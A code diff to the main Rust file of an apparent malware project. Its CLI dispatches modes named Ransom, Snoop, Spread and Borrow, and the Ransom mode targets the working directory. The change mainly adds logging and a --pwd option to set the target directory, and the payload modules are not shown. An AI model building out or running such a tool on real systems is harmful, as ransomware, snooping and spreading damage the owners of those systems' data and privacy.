@@ -1,9 +1,8 @@
-use std::path::PathBuf;
-
 use clap::{Parser, Subcommand};
-use config::{Config, ConfigError, File, FileFormat};
+use config::{Config, ConfigError, FileFormat};
 use env_logger::{fmt::Target, Builder};
-use log::{debug, error, info, log_enabled, LevelFilter};
+use log::{debug, error, info, log_enabled, Level, LevelFilter};
+use std::io::Write;
 
 mod borrow;
 mod ransom;
@@ -26,6 +25,10 @@ struct Cli {
     #[arg(short, long, value_name = "FILE")]
     output: Option<String>,
 
+    /// Set the current working directory
+    #[arg(short, long, value_name = "DIR")]
+    pwd: Option<String>,
+
     /// Turn debugging information on
     #[arg(short, long, action = clap::ArgAction::Count)]
     debug: u8,
@@ -45,28 +48,56 @@ enum Modes {
 fn read_config(path: &str) -> Result<Config, ConfigError> {
     let builder = Config::builder()
         .set_default("default", "1")?
-        .add_source(File::new(path, FileFormat::Json))
+        .add_source(config::File::new(path, FileFormat::Json))
         .set_override("override", "1")?;
 
     builder.build()
 }
 
 fn main() {
+    // get user input
     let cli = Cli::parse();
 
-    // Show the disable mode
-    match cli.debug {
-        0 => println!("Debug mode is off"),
-        1 => println!("Debug mode is kind of on"),
-        2 => println!("Debug mode is on"),
-        _ => println!("Don't be crazy"),
+    // set up logging
+    let mut builder = Builder::from_default_env();
+    builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
+    if let Some(save_to) = cli.output {
+        match std::fs::File::create(save_to) {
+            Ok(file) => {
+                builder.target(Target::Pipe(Box::new(file)));
+            }
+            Err(e) => println!("[ERROR]: {:?}", e),
+        }
     }
+
+    // set the logging verbosity
+    let verbosity = match cli.debug {
+        0 => Level::Error,
+        1 => Level::Warn,
+        2 => Level::Info,
+        3 => Level::Debug,
+        4 => Level::Trace,
+        _ => {
+            println!("ignoring additional debug flags");
+            Level::Trace
+        }
+    };
+    builder.filter(None, verbosity.to_level_filter()).init();
 
     // Check if the user provided a config path
     if let Some(config_path) = cli.config.as_deref() {
-        println!("{config_path:?}");
-        let conf: Config = read_config(config_path).unwrap();
-        println!("{conf:?}")
+        debug!("{config_path:?}");
+        match read_config(config_path) {
+            Ok(msg) => info!("{msg:?}"),
+            Err(e) => error!("{e:?}"),
+        }
+    }
+
+    if let Some(pwd) = cli.pwd {
+        match std::env::set_current_dir(pwd) {
+            Ok(msg) => info!("{msg:?}"),
+            Err(e) => error!("{e:?}"),
+        }
     }
 
     // check if the user specified a mode
@@ -74,16 +105,9 @@ fn main() {
         match mode {
             Modes::Borrow => borrow(),
             Modes::Ransom => ransom("./", "abcd.efg"),
-            Modes::Snoop => {
-                if let Some(output_dest) = cli.output {
-                    println!("{:?}", output_dest);
-                    snoop(Some(&output_dest))
-                } else {
-                    snoop(None)
-                }
-            }
+            Modes::Snoop => snoop(),
             Modes::Spread => spread(),
-            _ => unreachable!(), // panics if code becomes not unreachable
+            // _ => unreachable!(), // panics if code becomes not unreachable
         }
     };
 
